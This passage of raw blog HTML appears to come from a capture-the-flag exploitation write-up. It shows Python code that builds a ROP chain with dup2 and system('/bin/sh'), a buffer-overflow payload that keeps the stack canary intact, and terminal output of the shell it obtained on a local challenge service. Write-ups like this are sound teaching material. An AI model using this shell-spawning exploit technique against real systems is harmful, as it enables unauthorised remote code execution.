style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.dup2)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="rop  = b''&#34;&#34;&#34;libc.address + 0x10f78b : pop rdi ; retlibc.address + 0x110a7d : pop rsi ; retdup(4, 1)dup(4, 0)https://man7.org/linux/man-pages/man2/dup2.2.html&#34;&#34;&#34;rop += p64(libc.address + 0x10f78b)rop += p64(4)rop += p64(libc.address + 0x110a7d)rop += p64(1)rop += p64(libc.sym.dup2)rop += p64(libc.address + 0x10f78b)rop += p64(4)rop += p64(libc.address + 0x110a7d)rop += p64(0)rop += p64(libc.sym.dup2)"><div></div></button></div></figure></div>
<p>After this, we just need to do a ret2system:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:45ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x2882f  : ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x10f78b : pop rdi ; ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">system(&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2882f</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">next</span><span style="--0:#24292E;--1:#E1E4E8">(libc.search(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.system)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="&#34;&#34;&#34;libc.address + 0x2882f  : retlibc.address + 0x10f78b : pop rdi ; retsystem(&#34;/bin/sh\x00&#34;)&#34;&#34;&#34;rop += p64(libc.address + 0x2882f)rop += p64(libc.address + 0x10f78b)rop += p64(next(libc.search(b&#34;/bin/sh\x00&#34;)))rop += p64(libc.sym.system)"><div></div></button></div></figure></div>
<p>So, the whole payload looks like this:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:49ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;&#39;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x10f78b : pop rdi ; ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x110a7d : pop rsi ; ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">dup(4, 1)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">dup(4, 0)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">https://man7.org/linux/man-pages/man2/dup2.2.html</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">110a7d</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.dup2)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">110a7d</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.dup2)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x2882f  : ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x10f78b : pop rdi ; ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">system(&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2882f</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">next</span><span style="--0:#24292E;--1:#E1E4E8">(libc.search(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.system)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">payload </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> flat(</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;A&quot;</span><span style="--0:#BF3441;--1:#F97583">*0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">,                </span><span style="--0:#616972;--1:#99A0A6"># buffer</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">p64(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">),                    </span><span style="--0:#616972;--1:#99A0A6"># padding</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">p64(canary),               </span><span style="--0:#616972;--1:#99A0A6"># canary</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">p64(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">),                    </span><span style="--0:#616972;--1:#99A0A6"># rbp</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">rop                        </span><span style="--0:#616972;--1:#99A0A6"># rip</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(p64(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(payload)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(payload)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="rop  = b''&#34;&#34;&#34;libc.address + 0x10f78b : pop rdi ; retlibc.address + 0x110a7d : pop rsi ; retdup(4, 1)dup(4, 0)https://man7.org/linux/man-pages/man2/dup2.2.html&#34;&#34;&#34;rop += p64(libc.address + 0x10f78b)rop += p64(4)rop += p64(libc.address + 0x110a7d)rop += p64(1)rop += p64(libc.sym.dup2)rop += p64(libc.address + 0x10f78b)rop += p64(4)rop += p64(libc.address + 0x110a7d)rop += p64(0)rop += p64(libc.sym.dup2)&#34;&#34;&#34;libc.address + 0x2882f  : retlibc.address + 0x10f78b : pop rdi ; retsystem(&#34;/bin/sh\x00&#34;)&#34;&#34;&#34;rop += p64(libc.address + 0x2882f)rop += p64(libc.address + 0x10f78b)rop += p64(next(libc.search(b&#34;/bin/sh\x00&#34;)))rop += p64(libc.sym.system)payload = flat(  b&#34;A&#34;*0x100,                # buffer  p64(0),                    # padding  p64(canary),               # canary  p64(0),                    # rbp  rop                        # rip)r.send(p64(len(payload)))r.send(payload)"><div></div></button></div></figure></div>
<p>We can just the program <code>return</code> by sending a buffer size greater than or equal to <code>0x200</code>:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:18ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">r.send(p64(0x200))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="r.send(p64(0x200))"><div></div></button></div></figure></div>
<p>After the program returns it will execute our rop chain and give us shell!</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:64ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">python3</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">xpl.py</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[+] Opening connection to localhost on port 31337: Done</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">] Switching to interactive mode</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ls</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">-la</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">total</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">6376</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">drwxrwxr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">4096</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">10:30</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">.</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">drwxrwxr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">7</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">4096</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">08:30</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-r--</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">24601</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">09:01</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-r--</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">117</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">09:01</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">compose.yml</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-r--</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">293</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">09:01</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dockerfile</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rw-------</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">212</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">10:24</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">.gdb_history</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxr-xr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">236616</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">09:01</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ld-linux-x86-64.so.2</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxr-xr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">6229360</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">09:01</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libc.so.6</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-r--</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">1236</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">09:01</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">main.c</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-r--</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#005CC5;--1:#79B8FF">56</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span 